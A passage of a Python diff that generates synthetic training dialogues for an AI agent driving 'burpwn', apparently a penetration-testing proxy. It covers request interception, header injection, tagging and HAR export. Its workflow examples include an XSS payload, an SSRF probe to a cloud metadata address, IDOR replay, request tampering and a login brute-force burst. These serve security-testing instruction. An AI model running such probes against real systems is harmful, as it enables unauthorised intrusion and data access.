+                    '"error":null}\n```\n\nAn empty `items` array means nothing is parked (or '
+                    "interception is disabled).",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["intercept", "disable"],
-            user="I'm done tampering — stop holding requests.",
-            assistant=(
-                "```\nburpwn intercept disable\n```\n\n"
-                "Returns `{\"ok\":true,\"data\":{\"type\":\"Ack\"},\"error\":null}`. New "
-                "requests now flow straight through (still captured, just not parked). "
-                "Drop or forward any already-parked items first with `intercept list` if "
-                "you don't want them stuck."
-            ),
+            turns=[
+                ("user", "I'm done tampering — stop holding requests."),
+                (
+                    "assistant",
+                    "```\nburpwn intercept disable\n```\n\nReturns "
+                    '`{"ok":true,"data":{"type":"Ack"},"error":null}`. New requests now flow '
+                    "straight through (still captured, just not parked). Forward or drop any "
+                    "already-parked items first.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["intercept", "forward", "body"],
+            turns=[
+                (
+                    "user",
+                    "Parked intercept 2 is a checkout POST. Forward it but change the body to "
+                    "set qty=99 and the method stays POST.",
+                ),
+                (
+                    "assistant",
+                    "Forward with a body edit (CLI also supports `--method` if you needed to "
+                    "change the verb):\n\n```\nburpwn intercept forward 2 --set-body "
+                    "'{\"item\":\"sku-9\",\"qty\":99}' --set-header "
+                    '"Content-Type: application/json"\n```\n\nReturns '
+                    '`{"ok":true,"data":{"type":"Resolved","found":true},"error":null}`; the '
+                    "tampered request goes to the server and is captured like any other.",
+                ),
+            ],
+        )
+    )
+    return out
+
+
+def fam_match_replace() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+    out.append(
+        cli_example(
+            tags=["match-replace", "auth-inject"],
+            turns=[
+                ("user", "Inject a fixed bearer token into every request to all hosts."),
+                (
+                    "assistant",
+                    "Add a request-side rule on the `header` kind with an empty scope (= all "
+                    "hosts):\n\n```\nburpwn match-replace add \"\" header Authorization "
+                    '"Bearer eyJhbGciOi..."\n```\n\nReturns the new rule id '
+                    '`{"ok":true,"data":{"id":1},"error":null}`. Args are `<SCOPE> <KIND> '
+                    "<PATTERN> <REPLACEMENT>`; `--on request` is the default (use "
+                    "`--on response` to rewrite responses). Every subsequent `exec` request "
+                    "now carries the header.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["match-replace", "list", "interpret"],
+            turns=[
+                ("user", "What match/replace rules are active?"),
+                (
+                    "assistant",
+                    "```\nburpwn --json match-replace list\n```\n\n`data` is a bare array; "
+                    "each rule shows id, scope, kind, pattern, replacement, direction and "
+                    "enabled flag:\n\n```json\n"
+                    '{"ok":true,"data":[{"enabled":true,"id":1,"match_kind":"header",'
+                    '"on_request":true,"pattern":"Authorization","replacement":"Bearer ...",'
+                    '"scope":""}],"error":null}\n```',
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["match-replace", "scope", "response"],
+            turns=[
+                ("user", "On only *.acme.com responses, rewrite the string PRODUCTION to STAGING."),
+                (
+                    "assistant",
+                    "Scope it to the host glob, match on the `body` kind, apply on responses:"
+                    "\n\n```\nburpwn match-replace add \"*.acme.com\" body PRODUCTION STAGING "
+                    "--on response\n```\n\n`<SCOPE>` is a host glob (empty = all), `<KIND>` is "
+                    "one of `header|body|url|host`, and `--on response` flips it from the "
+                    "default request direction.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["match-replace", "url", "host"],
+            turns=[
+                (
+                    "user",
+                    "Rewrite the Host header so requests to www.acme.com hit the staging "
+                    "backend instead.",
+                ),
+                (
+                    "assistant",
+                    "Use the `host` kind on requests:\n\n```\nburpwn match-replace add "
+                    '"www.acme.com" host www.acme.com staging.acme.com\n```\n\nThe `host` and '
+                    "`url` kinds rewrite the request line/Host; `header` and `body` rewrite "
+                    "those parts. Confirm with `burpwn match-replace list`.",
+                ),
+            ],
+        )
+    )
+    return out
+
+
+def fam_tag_note_workspace() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+    for fid, name in [(14, "sqli"), (41, "idor"), (22, "bola"), (44, "jwt"),
+                      (17, "xss"), (9, "ssrf")]:
+        out.append(
+            cli_example(
+                tags=["tag", "triage", name],
+                turns=[
+                    (
+                        "user",
+                        f"Flag flow {fid} as a candidate {name.upper()} so I can find it later.",
+                    ),
+                    (
+                        "assistant",
+                        f"```\nburpwn tag add {fid} {name}\n```\n\nArgs are `<FLOW_ID> "
+                        f"<NAME>`; the tag is created if it doesn't exist. Returns "
+                        f'`{{"ok":true,"data":{{"flow_id":{fid},"name":"{name}",'
+                        f'"tag_id":2}},"error":null}}`.',
+                    ),
+                ],
+            )
+        )
+    out.append(
+        cli_example(
+            tags=["note", "triage"],
+            turns=[
+                ("user", "Add a note to flow 14 reminding me the id param looked injectable."),
+                (
+                    "assistant",
+                    '```\nburpwn note add 14 "id param reflects unescaped in SQL error"\n```\n\n'
+                    'Args are `<FLOW_ID> <TEXT>`. Returns `{"ok":true,"data":{"flow_id":14,'
+                    '"note_id":1},"error":null}`.',
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["workspace", "organise"],
+            turns=[
+                ("user", "Group this target's flows under a workspace called 'login-flow'."),
+                (
+                    "assistant",
+                    "Create the workspace, then attribute traffic by passing its **id** to "
+                    "`exec`/`req` (the `workspace use` command is informational only):\n\n```\n"
+                    "burpwn workspace new login-flow\nburpwn exec --workspace 3 -- curl -s "
+                    "https://acme.com/login\nburpwn req list --workspace 3\n```\n\n"
+                    '`workspace new` returns `{"ok":true,"data":{"id":3,"name":"login-flow"},'
+                    '"error":null}`; `workspace use <name>` merely records the choice in '
+                    "config and does not auto-scope, so always pass `--workspace <id>`.",
+                ),
+            ],
+        )
+    )
+    return out
+
+
+def fam_export() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+    out.append(
+        cli_example(
+            tags=["export", "har"],
+            turns=[
+                ("user", "Export all captured traffic to a HAR file for the report."),
+                (
+                    "assistant",
+                    "```\nburpwn export har -o session.har\n```\n\nWrites an HAR 1.2 document "
+                    "(`{\"log\":{\"version\":\"1.2\",\"creator\":{\"name\":\"burpwn\",...},"
+                    "\"entries\":[...]}}`); without `-o` it prints to stdout. Scope it with "
+                    "`--workspace <id>` to export just one bucket. HAR preserves the "
+                    "decrypted bodies a pcap of MITM'd TLS would not.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["export", "har", "workspace"],
+            turns=[
+                ("user", "Export just the login-flow workspace (id 3) as HAR to disk."),
+                (
+                    "assistant",
+                    "```\nburpwn export har --workspace 3 -o login-flow.har\n```\n\nOnly flows "
+                    "attributed to workspace 3 are included in the `entries` array.",
+                ),
+            ],
+        )
+    )
+    return out
+
+
+def fam_negatives() -> list[dict[str, Any]]:
+    """Errors / recovery / disambiguation — verified against the binary."""
+    out: list[dict[str, Any]] = []
+    out.append(
+        cli_example(
+            tags=["negative", "export", "pcap"],
+            turns=[
+                ("user", "Export the session as a pcap so I can open it in Wireshark."),
+                (
+                    "assistant",
+                    "pcap export is **not implemented** — it errors clearly:\n\n```json\n"
+                    '{"ok":false,"data":null,"error":"pcap export is not yet implemented '
+                    '(use `export har`)"}\n```\n\nUse HAR: `burpwn export har -o session.har`. '
+                    "Most HTTP tooling imports HAR, and it keeps the decrypted bodies a pcap "
+                    "of MITM'd TLS would not.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["negative", "match-replace", "rm"],
+            turns=[
+                ("user", "Remove match/replace rule 1."),
+                (
+                    "assistant",
+                    "Heads up: although `match-replace rm`, `enable` and `disable` exist as "
+                    "subcommands, they are **not yet supported at runtime** — the store "
+                    "writer exposes only add + list. Running it errors:\n\n```\nburpwn: "
+                    "match-replace rm/enable/disable are not yet supported: the store writer "
+                    "exposes only add + list for rules\n```\n\nWorkaround: rules apply only "
+                    "while the session's proxy daemon is running, so to clear a rule today "
+                    "you stop/restart the session's daemon (or start a fresh session) and "
+                    "re-add the rules you still want with `match-replace add`.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["negative", "dns"],
+            turns=[
+                ("user", "Does name resolution work inside the sandbox, or do I need raw IPs?"),
+                (
+                    "assistant",
+                    "DNS works — hostnames resolve normally. burpwn runs a resolver inside "
+                    "the namespace and **captures the lookups**: they appear as `dns` "
+                    "protocol flows with `method:\"QUERY\"` and paths like `acme.com./A` / "
+                    "`acme.com./AAAA`. So `burpwn exec -- curl https://acme.com` is fine; "
+                    "review resolution with `burpwn req list --protocol dns`.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["negative", "tls-passthru", "pinning"],
+            turns=[
+                ("user", "One host's requests show up as 'tls-passthru' with no decrypted body. Why?"),
+                (
+                    "assistant",
+                    "That host is **certificate-pinned** (or otherwise rejected burpwn's CA), "
+                    "so burpwn could not MITM it and let the TLS pass through untouched — "
+                    "hence the `tls-passthru` protocol and no plaintext. You still get the "
+                    "metadata (SNI, dst ip/port, timing) via "
+                    "`burpwn req list --protocol tls-passthru`, but not the body. burpwn "
+                    "deliberately doesn't break pinned connections.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["negative", "llm-traffic"],
+            turns=[
+                (
+                    "user",
+                    "If I run my AI agent under `burpwn exec`, won't burpwn capture the "
+                    "agent's own LLM API calls and pollute the flows?",
+                ),
+                (
+                    "assistant",
+                    "No. burpwn is designed so the **agent's own LLM traffic stays outside "
+                    "the sandbox** and is never captured — only the commands you launch via "
+                    "`burpwn exec -- <cmd>` (the actual pentest tooling) have their network "
+                    "forced through the proxy. So `req list` shows the target's traffic, not "
+                    "your model API calls.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["negative", "req-show", "missing"],
+            turns=[
+                ("user", "I ran `burpwn req show 999` and it said `burpwn: no such flow: 999`. Bug?"),
+                (
+                    "assistant",
+                    "Not a bug — flow 999 doesn't exist in the active session's store. List "
+                    "what's actually captured with `burpwn --json req list` and use a real "
+                    "`id`. Also confirm the session (`burpwn session list`); flows are "
+                    "per-session, so an id from another session won't resolve here.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["negative", "tag", "foreign-key"],
+            turns=[
+                (
+                    "user",
+                    "`burpwn tag add 500 sqli` failed with a sqlite FOREIGN KEY constraint "
+                    "error. What gives?",
+                ),
+                (
+                    "assistant",
+                    "Tags and notes reference an existing flow by id; flow 500 isn't in the "
+                    "store, so the foreign-key check fails. Find a real id first with "
+                    "`burpwn --json req list` (look at the `id` field) and tag that. The same "
+                    "applies to `burpwn note add <flow_id> <text>`.",
+                ),
+            ],
+        )
+    )
+    out.append(
+        cli_example(
+            tags=["negative", "intercept", "no-daemon"],
+            turns=[
+                (
+                    "user",
+                    "`burpwn intercept enable` says no proxy daemon is answering for the "
+                    "session. How do I start it?",
+                ),
+                (
+                    "assistant",
+                    "The interception commands drive a per-session proxy daemon that is "
+                    "spawned lazily by `exec`. Kick it off by running any command through the "
+                    "sandbox first:\n\n```\nburpwn exec -- curl -s https://acme.com/\n```\n\n"
+                    "That launches the daemon for the active session; then "
+                    "`burpwn intercept enable` / `await` will connect.",
+                ),
+            ],
         )
     )
     out.append(
         cli_example(
             tags=["negative", "intercept", "await-timeout"],
-            user=(
-                "`burpwn --json intercept await --timeout 5` returned "
-                '`{"ok":true,"data":{"type":"Pending","item":null},"error":null}`. Did it '
-                "fail?"
-            ),
-            assistant=(
-                "No — `item: null` just means nothing was parked within the 5-second "
-                "window (the long-poll timed out). That's normal when the app is idle. "
-                "Make sure interception is enabled (`burpwn intercept enable`), trigger "
-                "some traffic, and `await` again — increase `--timeout` (default 30) to "
-                "block longer."
-            ),
+            turns=[
+                (
+                    "user",
+                    "`burpwn --json intercept await --timeout 5` returned "
+                    '`{"ok":true,"data":{"type":"Pending","item":null},"error":null}`. Did it '
+                    "fail?",
+                ),
+                (
+                    "assistant",
+                    "No — `item:null` means nothing parked within the 5-second window (the "
+                    "long-poll timed out). Normal when the app is idle. Make sure "
+                    "interception is enabled (`burpwn intercept enable`), trigger traffic, "
+                    "and `await` again; raise `--timeout` (default 30) to block longer.",
+                ),
+            ],
         )
     )
+    return out
 
+
+def fam_meta() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+    out.append(
+        cli_example(
+            tags=["meta", "mcp-vs-cli"],
+            turns=[
+                ("user", "Should I drive burpwn via the shell or over MCP from my agent?"),
+                (
+                    "assistant",
+                    "Both expose the same engine. Use the **CLI** (`burpwn <cmd> --json`) for "
+                    "ad-hoc shell work, scripting and piping. Use the **MCP server** "
+                    "(`burpwn mcp`, stdio) when an LLM agent should call burpwn as tools — it "
+                    "exposes 19 tools (`req_list`, `req_show`, `req_search`, `exec`, "
+                    "`intercept_*`, `match_replace_*`, `tag_add`, `note_add`, "
+                    "`workspace_*`, `session_*`) with typed JSON arguments. One gotcha: the "
+                    "MCP tool *results* are NOT wrapped in `{ok,data,error}` and use "
+                    "different keys (e.g. `req_list` returns `{flows,count}`, intercept tools "
+                    "return `{ok:true}`/`{pending:...}`/`{found:...}`), so don't expect the "
+                    "CLI envelope shapes over MCP.",
+                ),
+            ],
+        )
+    )
     return out
 
 
 # --------------------------------------------------------------------------- #
-# MCP-style scenarios (tool args & results grounded in params.rs / handlers).
+# Multi-turn CLI workflows (2–8 turns) — reasoning-then-act.
 # --------------------------------------------------------------------------- #
 
 
-def mcp_records() -> list[dict[str, Any]]:
+def fam_cli_workflows() -> list[dict[str, Any]]:
+    out: list[dict[str, Any]] = []
+
+    # Recon -> search -> show -> tag (juice-shop XSS hunt)
+    out.append(
+        cli_example(
+            tags=["workflow", "multi-step", "xss", "juiceshop"],
+            turns=[
+                ("user", "Help me hunt reflected XSS on juice-shop's search."),
+                (
+                    "assistant",
+                    "Plan: fetch the search endpoint with a probe value, find the flow that "
+                    "reflects it, inspect the response, and flag it.\n\nStep 1 — fire a "
+                    "probe through the sandbox:\n```\nburpwn exec -- curl -s "
+                    "'https://juice-shop.local/rest/products/search?q=xsstest123'\n```",
+                ),
+                ("user", "Done. Now find which flow holds the reflection."),
+                (
+                    "assistant",
+                    "Full-text search the bodies for the probe:\n```\n"
+                    "burpwn --json req search xsstest123\n```\n→ "
+                    '`{"ok":true,"data":{"flow_ids":[14]},"error":null}`. Read flow 14 to '
+                    "see whether the value is HTML-encoded or reflected raw:\n```\n"
+                    "burpwn req show 14 --raw\n```",
+                ),
+                ("user", "It's reflected unencoded inside a <script> block."),
+                (
+                    "assistant",
+                    "That's reflected XSS. Flag and annotate it for the report:\n```\n"
+                    "burpwn tag add 14 xss\nburpwn note add 14 \"q param reflected "
+                    "unencoded into <script>; confirmed reflected XSS\"\n```\nThen craft a "
+                    "PoC payload (e.g. `q=<script>alert(document.domain)</script>`) and "
+                    "replay flow 14 with `--set-body`/a fresh `exec` curl to demonstrate.",
+                ),
+            ],
+        )
+    )
+
+    # IDOR end-to-end on REST API
+    out.append(
+        cli_example(
+            tags=["workflow", "multi-step", "idor", "bola", "restapi"],
+            turns=[
+                ("user", "Walk me through testing the shopwave API for IDOR on /v1/orders."),
+                (
+                    "assistant",
+                    "Plan: capture an authenticated request, read the response to learn the "
+                    "id scheme, then replay against another id.\n\nStep 1:\n```\n"
+                    "burpwn exec -- curl -s -H \"Authorization: Bearer $TOKEN\" "
+                    "https://api.shopwave.io/v1/orders/5001\n```",
+                ),
+                ("user", "Captured as flow 41. What next?"),
+                (
+                    "assistant",
+                    "Inspect it to confirm it returns *your* order and note the id scheme:\n"
+                    "```\nburpwn --json req show 41\n```\nThen replay against a neighbouring "
+                    "id — the id is in the path, so re-issue with curl rather than "
+                    "`req replay` (which can't edit the path):\n```\n"
+                    "burpwn exec -- curl -s -H \"Authorization: Bearer $TOKEN\" "
+                    "https://api.shopwave.io/v1/orders/5002\n```",
+                ),
+                ("user", "5002 returned someone else's order with 200."),
+                (
+                    "assistant",
+                    "That's a confirmed IDOR/BOLA: your token reads another tenant's order. "
+                    "Record it:\n```\nburpwn tag add 41 idor\nburpwn note add 41 \"GET "
+                    "/v1/orders/{id} returns other users' orders with own token — BOLA\"\n"
+                    "```\nExport the evidence for the report with "
+                    "`burpwn export har -o idor-evidence.har`.",
+                ),
+            ],
+        )
+    )
+
+    # SSRF on internal host
+    out.append(
+        cli_example(
+            tags=["workflow", "multi-step", "ssrf", "internal"],
+            turns=[
+                ("user", "The intranet app has a URL-fetch feature. Test it for SSRF."),
+                (
+                    "assistant",
+                    "Plan: submit a URL pointing at an internal/metadata target and see if "
+                    "the server fetches it.\n\nStep 1 — send the SSRF probe through the "
+                    "sandbox:\n```\nburpwn exec -- curl -s "
+                    "'http://intranet.corp.lan:8080/fetch?url=http://169.254.169.254/latest/meta-data/'"
+                    "\n```",
+                ),
+                ("user", "Captured. How do I confirm it actually reached the metadata endpoint?"),
+                (
+                    "assistant",
+                    "Search the captured responses for tell-tale metadata content and read "
+                    "the flow:\n```\nburpwn --json req search meta-data\nburpwn req show "
+                    "<id> --raw\n```\nIf the response body contains the metadata listing, "
+                    "the server fetched the internal URL on your behalf — SSRF. Tag it "
+                    "`ssrf` and note the reachable internal target.",
+                ),
+            ],
+        )
+    )
+
+    # Match-replace driven session-wide auth + ffuf
+    out.append(
+        cli_example(
+            tags=["workflow", "multi-step", "match-replace", "ffuf"],
+            turns=[
+                (
+                    "user",
+                    "I want to fuzz authenticated endpoints. Set a session-wide bearer token "
+                    "then fuzz.",
+                ),
+                (
+                    "assistant",
+                    "Plan: install a request match/replace rule to inject the token on every "
+                    "request, then run ffuf — each probe inherits the header automatically.\n"
+                    "\nStep 1 — add the rule:\n```\nburpwn match-replace add \"\" header "
+                    'Authorization "Bearer eyJ..."\n```\n→ `{"ok":true,"data":{"id":1},'
+                    '"error":null}`.',
+                ),
+                ("user", "Rule added. Now fuzz the API paths."),
+                (
+                    "assistant",
+                    "Run ffuf under the sandbox; every request goes out with the injected "
+                    "header:\n```\nburpwn exec --timeout 600 -- ffuf -u "
+                    "https://api.shopwave.io/v1/FUZZ -w api-words.txt -mc 200,403\n```\n"
+                    "Then triage authenticated hits: `burpwn req list --host "
+                    "api.shopwave.io --status 200`.",
+                ),
+            ],
+        )
+    )
+
+    # GraphQL introspection
+    out.append(
+        cli_example(
+            tags=["workflow", "multi-step", "graphql"],
+            turns=[
+                ("user", "Check whether the GraphQL API allows introspection."),
+                (
+                    "assistant",
+                    "Send an introspection query through the sandbox:\n```\nburpwn exec -- "
+                    "curl -s https://gql.acme-corp.com/graphql -H "
+                    "'Content-Type: application/json' -d "
+                    "'{\"query\":\"{__schema{types{name}}}\"}'\n```\nThen inspect the "
+                    "response:\n```\nburpwn --json req list --host gql.acme-corp.com "
+                    "--method POST\nburpwn req show <id>\n```",
+                ),
+                ("user", "It returned the full __schema types list."),
+                (
+                    "assistant",
+                    "Introspection is enabled and exposes the whole schema — useful for "
+                    "mapping mutations/queries, and often a finding in production. Tag the "
+                    "flow `graphql-introspection` and enumerate sensitive mutations next.",
+                ),
+            ],
+        )
+    )
+
+    # open-redirect
+    out.append(
+        cli_example(
+            tags=["workflow", "multi-step", "open-redirect"],
+            turns=[
+                ("user", "Test the login redirect param for an open redirect."),
+                (
+                    "assistant",
+                    "Send a request with an external `next`/`redirect` value and watch the "
+                    "Location header:\n```\nburpwn exec -- curl -s -o /dev/null -D - "
+                    "'https://app.fintrack.dev/login?next=https://evil.example/'\n```\nThen "
+                    "read the captured flow:\n```\nburpwn req show <id>\n```\nIf the response "
+                    "is a 30x with `Location: https://evil.example/`, it's an open redirect. "
+                    "Tag `open-redirect` and note the parameter.",
+                ),
+            ],
+        )
+    )
+
+    # CSRF check
+    out.append(
+        cli_example(
+            tags=["workflow", "multi-step", "csrf"],
+            turns=[
+                ("user", "Does the password-change endpoint have CSRF protection?"),
+                (
+                    "assistant",
+                    "Replay the captured state-changing request without the anti-CSRF token "
+                    "header and see if it still succeeds:\n```\nburpwn req replay 30 "
+                    '--set-header "X-CSRF-Token: "\n```\nA `200` that still changes state '
+                    "with the token stripped (and no SameSite cookie protection) indicates "
+                    "missing CSRF protection. A `403` is the expected, secure behaviour.",
+                ),
+            ],
+        )
+    )
+
+    # rate-limit
+    out.append(
+        cli_example(
+            tags=["workflow", "multi-step", "rate-limit"],
+            turns=[
+                ("user", "Check if the login endpoint enforces rate limiting."),
+                (
+                    "assistant",
+                    "Drive a quick burst through the sandbox and check the statuses:\n```\n"
+                    "burpwn exec -- bash -c 'for i in $(seq 1 50); do curl -s -o /dev/null "
+                    "-X POST https://app.fintrack.dev/login -d \"u=a&p=b$i\"; done'\n```\n"
+                    "Then list the results:\n```\nburpwn req list --host app.fintrack.dev "
+                    "--method POST --limit 60\n```\nIf you never see `429` (or a lockout) "
+                    "across 50 attempts, the endpoint lacks rate limiting / brute-force "
+                    "protection.",
+                ),
+            ],
+        )
+    )
+    return out
+
+
+# --------------------------------------------------------------------------- #
+# MCP single-tool examples (grounded result shapes from handlers.rs).
+# --------------------------------------------------------------------------- #
+
+
+def fam_mcp_single() -> list[dict[str, Any]]:
     out: list[dict[str, Any]] = []
 
     out.append(
         mcp_example(
-            tags=["mcp", "session_list"],
+            tags=["mcp", "session_current"],
             user="Which burpwn session is active?",
-            tool_name="session_current",
-            tool_args={},
-            tool_result={"active": "acme", "db_exists": True},
-            assistant_final=(
-                "You're on the `acme` session and its capture database exists, so it's "
-                "ready to query."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "req_list", "filter"],
-            user="List successful GET requests to api.acme.com.",
-            tool_name="req_list",
-            tool_args={"host": "api.acme.com", "method": "GET", "status": 200},
-            tool_result=[
-                {
-                    "id": 41,
-                    "authority": "api.acme.com",
-                    "method": "GET",
-                    "path": "/v1/me",
-                    "status": 200,
-                    "protocol": "h2",
-                    "scheme": "https",
-                    "dst_port": 443,
-                }
-            ],
-            assistant_final=(
-                "One matching flow: id 41, `GET https://api.acme.com/v1/me` → 200 over "
-                "HTTP/2. Want me to fetch its decoded request/response with `req_show`?"
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "req_show", "raw"],
-            user="Show me the raw bytes of flow 41 so I can build a PoC.",
-            tool_name="req_show",
-            tool_args={"id": 41, "raw": True},
-            tool_result={
-                "id": 41,
-                "protocol": "h2",
-                "request": {"method": "GET", "path": "/v1/me", "headers": "authorization: Bearer ...\r\n", "body": ""},
-                "response": {"status": 200, "headers": "content-type: application/json\r\n", "body": "{\"id\":1001,\"role\":\"user\"}"},
-                "raw_request": "GET /v1/me HTTP/2\r\nauthorization: Bearer ...\r\n\r\n",
-                "raw_response": "HTTP/2 200\r\ncontent-type: application/json\r\n\r\n{\"id\":1001,\"role\":\"user\"}",
-            },
-            assistant_final=(
-                "Flow 41 is `GET /v1/me` with a bearer token; the JSON response exposes "
-                "`{\"id\":1001,\"role\":\"user\"}`. The `raw_request`/`raw_response` fields "
-                "give you the byte-exact messages. Since the response leaks the numeric "
-                "user id, this is a good candidate to test for IDOR on `/v1/users/<id>`."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "req_search"],
-            user="Search captured traffic for anything containing 'token'.",
-            tool_name="req_search",
-            tool_args={"query": "token"},
-            tool_result={"flow_ids": [41, 37, 12]},
-            assistant_final=(
-                "Three flows mention 'token': ids 41, 37 and 12 (newest first). I can "
-                "`req_show` any of them to read the match in context."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "exec", "recon"],
-            user="Curl the acme.com homepage through the sandbox and tell me what got captured.",
-            tool_name="exec",
-            tool_args={"argv": ["curl", "-s", "-o", "/dev/null", "https://acme.com/"]},
-            tool_result={
-                "exit_code": 0,
-                "captured_request_ids": [50, 51, 52],
-                "exec_id": "exec-4101-0-1781400000000000000",
-            },
-            assistant_final=(
-                "The fetch succeeded (`exit_code: 0`) and captured three flows: 50, 51 "
-                "and 52 (the A/AAAA DNS queries plus the HTTPS GET). Use `req_show` on the "
-                "highest id (52) to see the decoded homepage response."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "exec", "timeout"],
-            user="Run a 5-minute nuclei scan against https://acme.com under the sandbox.",
-            tool_name="exec",
-            tool_args={
-                "argv": ["nuclei", "-u", "https://acme.com", "-silent"],
-                "timeout_secs": 300,
-            },
-            tool_result={
-                "exit_code": 0,
-                "captured_request_ids": [60, 61, 62, 63, 64],
-                "exec_id": "exec-4140-1-1781400500000000000",
-            },
-            assistant_final=(
-                "nuclei finished within the 5-minute budget and burpwn captured 5 flows "
-                "(60–64). Review them with `req_list` to see exactly which requests nuclei "
-                "sent and the live responses."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "match_replace_add", "auth-inject"],
-            user="Inject a bearer token into every request to all hosts.",
-            tool_name="match_replace_add",
-            tool_args={
-                "scope": "",
-                "kind": "header",
-                "pattern": "Authorization",
-                "replacement": "Bearer eyJhbGciOi...",
-                "on_request": True,
-            },
-            tool_result={"id": 1},
-            assistant_final=(
-                "Rule 1 is in place: on every request (empty scope = all hosts) the "
-                "`Authorization` header is set to your bearer token. New flows captured "
-                "via `exec` will carry it. Note `on_request: true` targets requests; set "
-                "it to `false` to rewrite responses."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "workspace_new"],
-            user="Create a workspace called login-flow.",
-            tool_name="workspace_new",
-            tool_args={"name": "login-flow"},
-            tool_result={"id": 3, "name": "login-flow"},
-            assistant_final=(
-                "Created workspace `login-flow` with id 3. Pass `workspace: \"3\"` (or the "
-                "id on the CLI) to `exec` to attribute captured flows to it."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "tag_add", "triage"],
-            user="Tag flow 41 as idor.",
-            tool_name="tag_add",
-            tool_args={"flow_id": 41, "name": "idor"},
-            tool_result={"flow_id": 41, "name": "idor", "tag_id": 2},
-            assistant_final="Flow 41 is now tagged `idor` (tag id 2).",
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "note_add", "triage"],
-            user="Note on flow 41 that /v1/me leaks the numeric user id.",
-            tool_name="note_add",
-            tool_args={"flow_id": 41, "body": "/v1/me response leaks numeric user id 1001 -> test IDOR"},
-            tool_result={"flow_id": 41, "note_id": 1},
-            assistant_final=(
-                "Note saved on flow 41. (Heads up: the MCP `note_add` argument is `body`, "
-                "whereas the CLI takes a positional `<TEXT>` — same effect.)"
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "intercept", "enable"],
-            user="Turn on live interception so I can tamper the next request.",
-            tool_name="intercept_enable",
-            tool_args={},
-            tool_result={"type": "Ack"},
-            assistant_final=(
-                "Interception is enabled (`Ack`). Call `await_intercept` to block for the "
-                "next parked request, then `intercept_forward` (with edits) or "
-                "`intercept_drop` to resolve it."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "await_intercept", "workflow"],
-            user="Wait up to 60s for the next request to be held, then I'll edit it.",
-            tool_name="await_intercept",
-            tool_args={"timeout_secs": 60},
-            tool_result={
-                "type": "Pending",
-                "item": {
-                    "id": 1,
-                    "method": "POST",
-                    "authority": "acme.com",
-                    "path": "/cart/checkout",
-                },
-            },
-            assistant_final=(
-                "A request is parked: intercept id 1, `POST acme.com/cart/checkout`. Tell "
-                "me what to change and I'll release it with `intercept_forward` (e.g. set "
-                "headers or replace the body), or drop it with `intercept_drop`."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "intercept_forward", "tamper"],
-            user="Forward the parked request (id 1) but bump the quantity and add an admin header.",
-            tool_name="intercept_forward",
-            tool_args={
-                "id": 1,
-                "set_headers": [{"name": "X-Admin", "value": "true"}],
-                "set_body": "{\"item\":\"sku-9\",\"qty\":99}",
-            },
-            tool_result={"type": "Resolved", "found": True},
-            assistant_final=(
-                "Forwarded intercept 1 with the `X-Admin: true` header and the tampered "
-                "body (`qty:99`). `found:true` confirms it was released. Note the MCP "
-                "`intercept_forward` takes `set_headers` as `[{name,value}]` and a "
-                "`set_body` string (no method override — use the CLI `--method` for that)."
-            ),
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "intercept_drop"],
-            user="Actually, drop parked intercept 2 — it's a telemetry beacon.",
-            tool_name="intercept_drop",
-            tool_args={"id": 2},
-            tool_result={"type": "Resolved", "found": True},
-            assistant_final="Dropped intercept 2; it will not be forwarded (`found:true`).",
-        )
-    )
-    out.append(
-        mcp_example(
-            tags=["mcp", "match_replace_list"],
-            user="What rewrite rules are configured?",
-            tool_name="match_replace_list",
-            tool_args={},
-            tool_result=[
-                {
-                    "id": 1,
-                    "scope": "",
-                    "match_kind": "header",
-                    "pattern": "Authorization",
-                    "replacement": "Bearer ...",
-                    "on_request": True,
-                    "enabled": True,
-                }
-            ],
-            assistant_final=(
-                "One enabled rule (id 1): on all-host requests, set the `Authorization` "
-                "header. There's no MCP tool to delete/disable rules (the store only "
-                "supports add + list), so to clear it you'd restart the session daemon."
-            ),
+            steps=[{
+                "tool": "session_current", "args": {},
+                "result": {"active": "acme", "db_exists": True},
+                "final": "You're on the `acme` session and its capture database exists, so "
+                         "it's ready to query.",
+            }],
         )
     )
     out.append(
         mcp_example(
             tags=["mcp", "session_list"],
             user="What sessions are available?",
-            tool_name="session_list",
-            tool_args={},
-            tool_result={"active": "acme", "sessions": ["default", "acme", "probe"]},
-            assistant_final=(
-                "Three sessions exist — `default`, `acme`, `probe` — and `acme` is "
-                "active."
-            ),
+            steps=[{
+                "tool": "session_list", "args": {},
+                "result": {"active": "acme", "sessions": ["default", "acme", "shopwave"]},
